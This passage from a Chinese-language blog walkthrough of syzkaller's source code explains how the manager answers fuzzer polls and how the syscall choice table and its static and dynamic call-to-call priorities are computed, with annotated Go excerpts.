&#123;<br>serv.maxSignal.Merge(newMaxSignal)<br>serv.stats.maxSignal.set(<span class="hljs-built_in">len</span>(serv.maxSignal))<br><span class="hljs-keyword">for</span> _, f1 := <span class="hljs-keyword">range</span> serv.fuzzers &#123;<br><span class="hljs-keyword">if</span> f1 == f || f1.rotated &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>f1.newMaxSignal.Merge(newMaxSignal)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>如果该 syz-fuzzer 对应的 VM 实例正在轮转运行，则直接返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> f.rotated &#123;<br><span class="hljs-comment">// 让轮转中的 VMs 独立运行，不要向他们发送任何东西</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>接下来写入新的最大信号，之后检查 syz-fuzzer 是否向 syz-manager 请求了新的 candidate，若是则调用 <code>candidateBatch()</code> 获取，该函数的作用主要是从 syz-manager 上的 candidate 队列中获取一定数量的 candidate</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">r.MaxSignal = f.newMaxSignal.Split(<span class="hljs-number">2000</span>).Serialize()<br><span class="hljs-keyword">if</span> a.NeedCandidates &#123;<br>r.Candidates = serv.mgr.candidateBatch(serv.batchSize)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>若获取到的 candidate 数量为 0，说明是第一次 <code>poll()</code>，这时便从初始化时所读取的语料库中获取输入作为 candidate 返还给 syz-fuzzer</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &#123;<br>batchSize := serv.batchSize<br><span class="hljs-comment">// 当 fuzzer 启动时, 其会抽取所有的语料库.</span><br><span class="hljs-comment">// 若我们使用最后的 batchSize 进行操作, 这将会非常慢</span><br><span class="hljs-comment">// (对于 50k 的语料库与慢内核而言，一批大小为 6 可能需要10min以上的时间).</span><br><span class="hljs-comment">// 所以在最初就使用更大的批量 (we use no stats as approximation of initial pump).</span><br><span class="hljs-keyword">const</span> initialBatch = <span class="hljs-number">50</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a.Stats) == <span class="hljs-number">0</span> &amp;&amp; batchSize &lt; initialBatch &#123;<br>batchSize = initialBatch<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; batchSize &amp;&amp; <span class="hljs-built_in">len</span>(f.inputs) &gt; <span class="hljs-number">0</span>; i++ &#123;<br>last := <span class="hljs-built_in">len</span>(f.inputs) - <span class="hljs-number">1</span><br>r.NewInputs = <span class="hljs-built_in">append</span>(r.NewInputs, f.inputs[last])<br>f.inputs[last] = rpctype.Input&#123;&#125;<br>f.inputs = f.inputs[:last]<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(f.inputs) == <span class="hljs-number">0</span> &#123;<br>f.inputs = <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;poll from %v: candidates=%v inputs=%v maxsignal=%v&quot;</span>,<br>a.Name, <span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), <span class="hljs-built_in">len</span>(r.MaxSignal.Elems))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="构建【系统调用生成优先级表】"><a href="#构建【系统调用生成优先级表】" class="headerlink" title="构建【系统调用生成优先级表】"></a>构建【系统调用生成优先级表】</h2><p>接下来是正式进行 fuzzing 之前最核心的一步——构建<strong>【系统调用生成优先级表】</strong> <code>choiceTable</code> ，该表的作用是：</p><ul><li><strong>计算对于给定的系统调用 x，在添加入系统调用 y 后，代码覆盖率会上升的可能性</strong></li></ul><p>从而<strong>在后续的 fuzzing 过程当中使用该表对输入进行变异</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">calls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, id := <span class="hljs-keyword">range</span> r.CheckResult.EnabledCalls[sandbox] &#123;<br>calls[target.Syscalls[id]] = <span class="hljs-literal">true</span><br>&#125;<br>fuzzer.choiceTable = target.BuildChoiceTable(fuzzer.corpus, calls)<br></code></pre></td></tr></table></figure><p><code>choiceTable</code> 的计算通过 定义于<code>prog/prio.go</code> 中的 <code>BuildChoiceTable()</code> 完成：</p><ul><li>首先建立两个表：<ul><li>① <code>Syscall→bool</code> 的表 <code>enable</code>，表示<strong>启用的系统调用</strong>，并将所有系统调用都初始化为 <code>true</code> </li><li>② <code>int→bool</code> 的表 <code>noGenerateCalls</code> ，表示<strong>不用于生成的系统调用</strong></li></ul></li><li>接下来遍历系统调用属性（在 syzlang 规则文件中编写），若某个系统调用不开启则将其从 <code>enable</code> 表中去除，若某个系统调用不用于生成则将其从 <code>enable</code> 表中去除并添加到 <code>noGenerateCalls</code> 表</li><li>之后创建第三个表 <code>generateCalls</code>，为 <code>enable</code> 表的拷贝，表示<strong>用于生成的系统调用</strong>，并根据系统调用号进行从小到大的排序</li></ul><blockquote><p>这里的【生成】指的是生成新的输入，即我们是否在输入生成时添加该系统调用</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> BuildChoiceTable(corpus []*Prog, enabled <span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>) *ChoiceTable &#123;<br><span class="hljs-keyword">if</span> enabled == <span class="hljs-literal">nil</span> &#123;<br>enabled = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> target.Syscalls &#123;<br>enabled[c] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>noGenerateCalls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> call := <span class="hljs-keyword">range</span> enabled &#123;<br><span class="hljs-keyword">if</span> call.Attrs.Disabled &#123;<br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> call.Attrs.NoGenerate &#123;<br>noGenerateCalls[call.ID] = <span class="hljs-literal">true</span><br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125;<br>&#125;<br>    <span class="hljs-keyword">var</span> generatableCalls []*Syscall<br><span class="hljs-keyword">for</span> c := <span class="hljs-keyword">range</span> enabled &#123;<br>generatableCalls = <span class="hljs-built_in">append</span>(generatableCalls, c)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(generatableCalls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;no syscalls enabled and generatable&quot;</span>)<br>&#125;<br>sort.Slice(generatableCalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> generatableCalls[i].ID &lt; generatableCalls[j].ID<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>接下来判断语料库中是否包含有禁用的系统调用，若是则直接退出</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus &#123;<br><span class="hljs-keyword">for</span> _, call := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">if</span> !enabled[call.Meta] &amp;&amp; !noGenerateCalls[call.Meta.ID] &#123;<br>fmt.Printf(<span class="hljs-string">&quot;corpus contains disabled syscall %v\n&quot;</span>, call.Meta.Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled syscall&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>最后调用 <code>target.CalculatePriorities(corpus)</code> <strong>基于语料库进行系统调用生成优先级表的计算</strong></li><li>完成后生成一个新的表 <code>run</code> 作为结果与生成&amp;不生成系统调用表一起返回，其中存储的是对于启用的系统调用而言的<strong>加权权重的累加和</strong></li></ul><blockquote><p>例如有给定的三个系统调用 A、B、C，有这样的一个生成优先级表 <code>prios</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>那么在 <code>run</code> 表中则会将一列的结果逐个加起来，从而有这样的一个结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>为什么要这么做笔者也不知道：(</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := target.CalculatePriorities(corpus)<br>run := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-comment">// ChoiceTable.runs[][] 包含对加权优先级数字的累加总和.</span><br><span class="hljs-comment">// 这在生成程序时有助于带权快速二叉搜索.</span><br><span class="hljs-comment">// 这仅用于在目标上所启用的系统调用.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> run &#123;<br><span class="hljs-keyword">if</span> !enabled[target.Syscalls[i]] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>run[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">var</span> sum <span class="hljs-type">int32</span><br><span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> run[i] &#123;<br><span class="hljs-keyword">if</span> enabled[target.Syscalls[j]] &#123;<br>sum += prios[i][j]<br>&#125;<br>run[i][j] = sum<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> &amp;ChoiceTable&#123;target, run, generatableCalls, noGenerateCalls&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】target-CalculatePriorities-corpus-：计算-call-to-call-的权重表"><a href="#【核心】target-CalculatePriorities-corpus-：计算-call-to-call-的权重表" class="headerlink" title="【核心】target.CalculatePriorities(corpus)：计算 call-to-call 的权重表"></a>【核心】target.CalculatePriorities(corpus)：计算 call-to-call 的权重表</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>CalculatePriorities(corpus)</code> 为系统调用生成优先级表的核心计算过程，代码其实比较简单（不过注释很长），主要分为<strong>静态优先级</strong>与<strong>动态优先级</strong>两部分进行计算，默认进行静态优先级的计算，若语料库不为空则再计算动态优先级：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 计算 call-to-call 的优先级.</span><br><span class="hljs-comment">// 对于一对给定的调用 X 与 Y, 优先级便是我们对于</span><br><span class="hljs-comment">// 将一个额外的调用 Y 添加到一个包含有调用 X 的程序当中</span><br><span class="hljs-comment">// 是否有可能给出新的覆盖率的猜测.</span><br><span class="hljs-comment">// 当前的算法有两个部分：静态与动态.</span><br><span class="hljs-comment">// 静态部分基于对参数类型的分析. 举个🌰,</span><br><span class="hljs-comment">// 若调用 X 与 Y 都接受 fd[sock], 则他们更有可能一起给出新的覆盖率.</span><br><span class="hljs-comment">// 动态部分则基于语料库中一对特定的系统调用在一个程序中出现的频率.</span><br><span class="hljs-comment">// 例如，若 socket 与 connect 频繁地在一个程序中一起出现，</span><br><span class="hljs-comment">// 我们给这对系统调用更高的优先级.</span><br><span class="hljs-comment">// 注意: 当前的实现非常简陋, 任何常量背后都没有理论支持.</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> CalculatePriorities(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>static := target.calcStaticPriorities()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(corpus) != <span class="hljs-number">0</span> &#123;<br>dynamic := target.calcDynamicPrio(corpus)<br><span class="hljs-keyword">for</span> i, prios := <span class="hljs-keyword">range</span> dynamic &#123;<br>dst := static[i]<br><span class="hljs-keyword">for</span> j, p := <span class="hljs-keyword">range</span> prios &#123;<br>dst[j] = dst[j] * p / prioHigh<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> static<br>&#125;<br></code></pre></td></tr></table></figure><p>对于给定的系统调用 X，添加系统调用 Y 的优先级为：<br>$$<br>最终优先级 &#x3D; 静态优先级 * 动态优先级 &#x2F; prioHigh<br>$$<br> 其中 <code>prioHigh</code> 为一个常量 <code>1000</code></p><h4 id="①-calcStaticPriorities-：静态优先级计算"><a href="#①-calcStaticPriorities-：静态优先级计算" class="headerlink" title="① calcStaticPriorities()：静态优先级计算"></a>① calcStaticPriorities()：静态优先级计算</h4><h5 id="Step-I-计算资源使用情况"><a href="#Step-I-计算资源使用情况" class="headerlink" title="Step.I - 计算资源使用情况"></a>Step.I - 计算资源使用情况</h5><blockquote><p>注：这里的【资源】更严谨地说应该是 syzlang 中的 <a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#VI-%E8%B5%84%E6%BA%90%EF%BC%88resources%EF%BC%89">resource</a></p></blockquote><p><code>calcStaticPriorities()</code> 用以完成静态优先级的计算，该函数首先会调用 <code>calcResourceUsage()</code> 获取当前的【资源使用情况】：</p><ul><li>该函数的返回结果为一个二重映射 <code>资源名（string）→【系统调用号（int）→权重（weights）】</code> </li><li>该函数的核心逻辑便是调用 <code>ForeachType()</code> 进行分析</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcStaticPriorities() [][]<span class="hljs-type">int32</span> &#123;<br>uses := target.calcResourceUsage()<br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcResourceUsage() <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights &#123;<br>uses := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>ForeachType(target.Syscalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> uses<br>&#125;<br></code></pre></td></tr></table></figure><p>我们稍后再来分析传入的闭包函数，我们首先分析 <code>ForeachType()</code> ，其会遍历系统调用表并调用 <code>foreachTypeImpl()</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachTypePost</span><span class="hljs-params">(syscalls []*Syscall, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-keyword">for</span> _, meta := <span class="hljs-keyword">range</span> syscalls &#123;<br>foreachTypeImpl(meta, <span class="hljs-literal">false</span>, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>foreachTypeImpl()</code>  用以处理单个系统调用，其首先会创建一个 <code>类型→bool</code> 的映射 <code>seen</code>，接下来会创建一个闭包函数 <code>rec</code> ，该函数会根据传入类型的不同进行不同操作：</p><blockquote><p>注：这里的类型应当为 syzlang 中的类型</p></blockquote><ul><li>若是指针类型 （<code>PtrType</code> ），则递归调用  <code>rec</code> </li><li>若是数组类型（<code>ArrayType</code> ），则递归调用 <code>rec</code></li><li>若是结构体类型（<code>StructType</code>）且不在 <code>seen</code> 中，将其添加到 <code>seen</code> 中，并为每一个结构体成员调用 <code>rec</code> </li><li>若是联合类型（<code>UnionType</code>）且不在 <code>seen</code> 中，将其添加到 <code>seen</code> 中，并为每一个联合成员调用 <code>rec</code> </li><li>其他合法类型则直接跳过，非法类型（syzlang 编译期错误）则 panic</li><li>最后调用上层传入的闭包函数（我们在 <code>ForeachTypePost()</code> 中传入 <code>preorder = false</code>）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachTypeImpl</span><span class="hljs-params">(meta *Syscall, preorder <span class="hljs-type">bool</span>, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-comment">// 注意: 我们特意不在 ForeachType 中创建 seen..</span><br><span class="hljs-comment">// 其能更好地对递归进行剪枝 (在系统调用间), 但大量的使用者需要</span><br><span class="hljs-comment">// 对单个系统调用访问每个结构体 (例如 prio, used resources).</span><br>seen := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[Type]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> rec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Type, Dir)</span></span><br>rec = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ptr *Type, dir Dir)</span></span> &#123;<br>ctx := &amp;TypeCtx&#123;Meta: meta, Dir: dir, Ptr: ptr&#125;<br><span class="hljs-keyword">if</span> preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> a := (*ptr).(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *PtrType:<br>rec(&amp;a.Elem, a.ElemDir)<br><span class="hljs-keyword">case</span> *ArrayType:<br>rec(&amp;a.Elem, dir)<br><span class="hljs-keyword">case</span> *StructType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// 通过对structs/unions的指针来剪枝掉递归</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *UnionType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// 通过对structs/unions的指针来剪枝掉递归</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *ResourceType, *BufferType, *VmaType, *LenType, *FlagsType,<br>*ConstType, *IntType, *ProcType, *CsumType:<br><span class="hljs-keyword">case</span> Ref:<br><span class="hljs-comment">// 仅 pkg/compiler 需要.</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown type&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> !preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;Stop is set in post-order iteration&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>foreachTypeImpl()</code> 实际上便是为传入的系统调用的每个参数都调用 <code>rec()</code>，若存在返回值也为其调用 <code>rec</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> meta.Args &#123;<br>rec(&amp;meta.Args[i].Type, DirIn)<br>&#125;<br><span class="hljs-keyword">if</span> meta.Ret != <span class="hljs-literal">nil</span> &#123;<br>rec(&amp;meta.Ret, DirOut)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们回到 <code>calcResourceUsage()</code> 看其传给 <code>ForeachType()</code> 的闭包函数，也是根据系统调用的参数的类型不同进行处理：</p><blockquote><p>这里的 <code>a</code> 为 Type 接口， a.Desc 为 ResourceDesc类型，即对一个资源的描述，其 Kind 域为一个 string 数组，Values 域为一个 uint64 数组</p></blockquote><ul><li><p>若是资源类型 （<code>ResourceType</code> ）：</p><ul><li>若在 <code>AuxResources</code> 表（辅助资源表，即扮演着辅助角色但是在所有系统调用中都会用到的资源（例如uid&#x2F;gid））里已有记录，则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 1</li><li>否则，遍历 <code>a.Desc.Kind</code> ，调用 <code>noteUsage()</code> 更新权重值，这里给除了最后一个 Kind 以外的权重值为 2，最后一个为 10</li></ul></li><li><p>若是指针类型（<code>PttrType</code>），则判断指针所指对象类型（结构体&#x2F;联合体&#x2F;数组）并调用 <code>noteUsage()</code> 更新权重值，这里给的权重值都为 10</p></li><li><p>若是 buffer 类型（<code>BufferType</code>），则根据 <code>a.Kind</code> 进行不同处理：</p><ul><li><code>BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed</code> ：无处理</li><li><code>BufferString, BufferGlob</code> ：若 <code>a.SubKind != &quot;&quot;</code>，则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 2</li><li><code>BufferFilename</code>：调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 10</li></ul></li><li><p>若为 VMA 类型 （<code>VmaType</code>），则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 5</p></li><li><p>对于整型则检查 <code>a.Kind</code> 是否为 <code>IntPlain, IntRange</code>，若不是则直接 panic</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br>c := ctx.Meta<br><span class="hljs-keyword">switch</span> a := t.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ResourceType:<br><span class="hljs-keyword">if</span> target.AuxResources[a.Desc.Name] &#123;<br>noteUsage(uses, c, <span class="hljs-number">1</span>, ctx.Dir, <span class="hljs-string">&quot;res%v&quot;</span>, a.Desc.Name)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>str := <span class="hljs-string">&quot;res&quot;</span><br><span class="hljs-keyword">for</span> i, k := <span class="hljs-keyword">range</span> a.Desc.Kind &#123;<br>str += <span class="hljs-string">&quot;-&quot;</span> + k<br>w := <span class="hljs-type">int32</span>(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-built_in">len</span>(a.Desc.Kind)<span class="hljs-number">-1</span> &#123;<br>w = <span class="hljs-number">2</span><br>&#125;<br>noteUsage(uses, c, w, ctx.Dir, str)<br>&#125;<br>&#125;<br><span class="hljs-keyword">case</span> *PtrType:<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*StructType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, 